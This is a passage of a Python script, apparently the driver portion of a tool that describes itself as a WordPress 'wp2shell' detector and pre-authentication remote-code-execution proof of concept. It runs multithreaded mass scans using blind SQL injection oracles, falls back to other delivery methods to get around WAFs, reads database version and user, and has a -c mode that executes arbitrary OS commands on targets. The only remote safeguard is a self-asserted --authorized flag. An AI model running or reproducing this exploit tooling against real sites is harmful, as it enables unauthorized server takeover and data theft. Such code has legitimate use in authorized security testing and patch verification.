# -- driver ----------------------------------------------------------------
def is_local(base):
    host = urllib.parse.urlparse(base).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def scan_one(url, args):
    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
               route=args.route, delivery=args.delivery)
    rec = {"target": url}
    # automatic oracle + delivery selection with fallback (see Target.detect_auto)
    try:
        res = t.detect_auto(method=args.method, rounds=args.rounds)
    except urllib.error.URLError as e:
        rec.update(status="error", error=str(e.reason))
        return rec, 2
    active = res["vulnerable"]
    rec["delivery"] = res.get("delivery")
    if active:
        rec["method"] = res["method"]
        if res["method"] == "boolean":
            boo = res["boolean"]
            rec["bool_signal"] = boo["signal"]
            rec["bool_true_rows"] = boo["true_total"] if boo["true_total"] is not None else boo["true_posts"]
            rec["bool_false_rows"] = boo["false_total"] if boo["false_total"] is not None else boo["false_posts"]
    # surface time evidence whenever the SLEEP oracle actually ran (confirm or negative)
    det = res.get("time")
    if isinstance(det, dict) and "fast" in det:
        rec["fast_s"] = round(det["fast"], 3)
        rec["slow_s"] = round(det["slow"], 3)
        rec["delta_s"] = round(det["delta"], 3)
    ver = fingerprint_version(t)
    rec["wp_version"] = ver
    rec["version_verdict"] = version_verdict(ver)
    vv = rec["version_verdict"]
    rec["active_check"] = "fired" if active else "negative"
    if active:
        rec["status"] = "vulnerable"                     # actively confirmed via the injection
    elif vv in ("affected-full-chain", "affected-sqli-sink-only"):
        rec["status"] = "affected_version"               # version affected; active probe didn't confirm
        if vv == "affected-sqli-sink-only":
            rec["note"] = ("version affected by the author__not_in SQLi (CVE-2026-60137, fixed 6.8.6); "
                           "the batch-route confusion that delivers it unauthenticated is 6.9.0+, so "
                           "there is no unauth active check on the 6.8.x branch")
        else:
            rec["note"] = ("version in the full-chain range but the active injection did not fire "
                           "(a WAF/edge may be blocking the batch payload, or the probe was throttled) "
                           "-- treat as affected and patch")
    else:
        rec["status"] = "not_vulnerable"
    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
    if active and args.proof:
        # read_scalar uses the time-based oracle; establish a latency baseline if the
        # boolean method confirmed without ever running the timing probe.
        if t._base <= 0:
            try:
                t.detect(rounds=args.rounds)
            except urllib.error.URLError:
                pass
        try:
            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
        except Exception as e:
            rec["proof_error"] = str(e)
    return rec, code


def human(rec):
    tag = {"vulnerable": "VULNERABLE", "affected_version": "AFFECTED (version)",
           "not_vulnerable": "not vulnerable", "error": "ERROR"}[rec["status"]]
    line = "[%s] %s" % (tag, rec["target"])
    if rec.get("wp_version"):
        line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
    if rec["status"] == "error":
        line += "  -- %s" % rec.get("error")
    else:
        bits = []
        if rec.get("method") == "boolean":
            bits.append("method=boolean rows(true/false)=%s/%s via %s" % (
                rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
        if "delta_s" in rec:
            bits.append("method=time fast=%.2fs slow=%.2fs delta=%.2fs" % (
                rec["fast_s"], rec["slow_s"], rec["delta_s"]))
        if rec.get("delivery"):
            bits.append("delivery=%s" % rec["delivery"])
        if bits:
            line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
    out = [line]
    if rec.get("note"):
        out.append("        note: " + rec["note"])
    if rec.get("proof"):
        for k, v in rec["proof"].items():
            out.append("        proof  %-16s = %s" % (k, v))
    return "\n".join(out)


def main():
    p = argparse.ArgumentParser(
        description="wp2shell (CVE-2026-63030/60137) detector & pre-auth RCE PoC.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-c", "--command", metavar="CMD",
                   help="OS command to execute via pre-auth RCE (requires --authorized for remote)")
    p.add_argument("-f", "--file", help="file with one target URL per line (# comments ok)")
    p.add_argument("--proof", action="store_true",
                   help="read @@version + current_user() as evidence (read-only)")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--method", choices=("auto", "boolean", "time"), default="auto",
                   help="detection oracle. auto (default) tries the fast boolean row-count "
                        "differential first and falls back to the time-based SLEEP oracle; "
                        "boolean/time force one.")
    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
                   help="batch delivery. auto (default) uses a JSON POST to the batch route and "
                        "falls back to a rest_route=/batch/v1 multipart form on POST / if the JSON "
                        "batch isn't processed (e.g. an edge blocks /wp-json). json/multipart force one.")
    p.add_argument("--multipart", action="store_true",
                   help="alias for --delivery multipart (the exact operator request shape)")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="concurrent workers for -f scans (default 10)")
    p.add_argument("--authorized", action="store_true",
                   help="assert authorization for remote targets")
    p.add_argument("--json", action="store_true", help="emit JSON")
    args = p.parse_args()
    if args.multipart:
        args.delivery = "multipart"

    # -- RCE mode (-c COMMAND) ------------------------------------------------
    if args.command:
        if not args.url:
            p.error("-c requires a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("-c on remote targets requires --authorized")
        # RCE forge + extraction is JSON end-to-end and needs the timing oracle baseline.
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route, delivery="json")
        try:
            det = t.detect(rounds=args.rounds)
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not det["vulnerable"]:
            print("[-] not vulnerable"); return 1
        print("[+] vulnerable (blind SQLi: %.3fs / %.3fs)" % (det["fast"], det["slow"]))
        try:
            user, pw, output = t.exploit(args.command)
        except (RuntimeError, urllib.error.URLError) as e:
            print("[-] exploit failed: %s" % e); return 2
        print("[+] RCE output:\n")
        print(output, end="")
        return 0

    # -- detection mode (default) ---------------------------------------------
    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh
                       if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_one(prep(u), args)
        except Exception as e:                       # one bad host must never kill the run
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
                     "not_vulnerable=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    # exit 0 if any host needs attention (actively vulnerable or affected version),
    # else 1 (all clear), else 2 (all errored)
    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    if results and all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
